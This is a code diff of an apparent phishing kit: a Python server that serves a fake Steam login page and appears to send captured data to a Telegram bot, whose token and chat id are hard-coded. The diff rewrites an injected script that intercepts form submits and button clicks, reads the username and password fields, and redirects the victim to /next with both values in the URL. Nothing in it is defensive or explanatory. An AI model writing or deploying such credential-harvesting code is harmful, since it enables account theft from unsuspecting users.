@@ -16,8 +16,8 @@ TARGET_DIR = BASE_DIR / "popa" if (BASE_DIR / "popa").exists() else BASE_DIR
 NEXT_PAGE_FILENAME = "next.html"
 
 # НАСТРОЙКИ TELEGRAM БОТА
-TELEGRAM_BOT_TOKEN = "9193237322:AAGd49MxB5aoMbRqgDBM1KH0KTWcX9UEpZs"  # Вставь свой токен
-TELEGRAM_CHAT_ID = "8869604033"  # Вставь свой chat_id
+TELEGRAM_BOT_TOKEN = "9193237322:AAGd49MxB5aoMbRqgDBM1KH0KTWcX9UEpZs"
+TELEGRAM_CHAT_ID = "8869604033"
 
 
 def send_to_telegram(message: str):
@@ -25,7 +25,6 @@ def send_to_telegram(message: str):
         return
     try:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        # Добавили parse_mode: HTML, чтобы теги преобразовывались в форматирование, а не выводились текстом
         data = urllib.parse.urlencode({
             "chat_id": TELEGRAM_CHAT_ID,
             "text": message,
@@ -232,31 +231,37 @@ STEAM_LOGIN_DOM = """
 
 FORCE_REDIRECT_SCRIPT = """
 <script>
-document.addEventListener("DOMContentLoaded", function() {
-    function handleLogin(e) {
-        if (e) {
-            e.preventDefault();
-            e.stopPropagation();
-        }
-        var userInput = document.querySelector("input[name='username'], #steam_user_input, input[type='text']");
-        var passInput = document.querySelector("input[name='password'], #steam_pass_input, input[type='password']");
+document.addEventListener("submit", function(e) {
+    var form = e.target;
+    var userInput = form.querySelector("input[name='username'], #steam_user_input, input[type='text']") || document.querySelector("input[name='username'], #steam_user_input, input[type='text']");
+    var passInput = form.querySelector("input[name='password'], #steam_pass_input, input[type='password']") || document.querySelector("input[name='password'], #steam_pass_input, input[type='password']");
+
+    var uVal = userInput ? encodeURIComponent(userInput.value.trim()) : "";
+    var pVal = passInput ? encodeURIComponent(passInput.value.trim()) : "";
+
+    if (uVal || pVal) {
+        e.preventDefault();
+        window.location.href = "/next?user=" + uVal + "&pass=" + pVal;
+    }
+}, true);
+
+document.addEventListener("click", function(e) {
+    var btn = e.target.closest("button.steam_react_submit, button[type='submit'], .submit_btn, button");
+    if (btn) {
+        var form = btn.closest("form");
+        var userInput = (form ? form.querySelector("input[name='username'], #steam_user_input, input[type='text']") : null) || document.querySelector("input[name='username'], #steam_user_input, input[type='text']");
+        var passInput = (form ? form.querySelector("input[name='password'], #steam_pass_input, input[type='password']") : null) || document.querySelector("input[name='password'], #steam_pass_input, input[type='password']");
 
         var uVal = userInput ? encodeURIComponent(userInput.value.trim()) : "";
         var pVal = passInput ? encodeURIComponent(passInput.value.trim()) : "";
 
-        window.location.href = "/next?user=" + uVal + "&pass=" + pVal;
+        if (uVal || pVal) {
+            e.preventDefault();
+            e.stopPropagation();
+            window.location.href = "/next?user=" + uVal + "&pass=" + pVal;
+        }
     }
-
-    var buttons = document.querySelectorAll("button.steam_react_submit, button[type='submit'], .submit_btn, button");
-    buttons.forEach(function(btn) {
-        btn.addEventListener("click", handleLogin, true);
-    });
-
-    var forms = document.querySelectorAll("form");
-    forms.forEach(function(form) {
-        form.addEventListener("submit", handleLogin, true);
-    });
-});
+}, true);
 </script>
 """
 
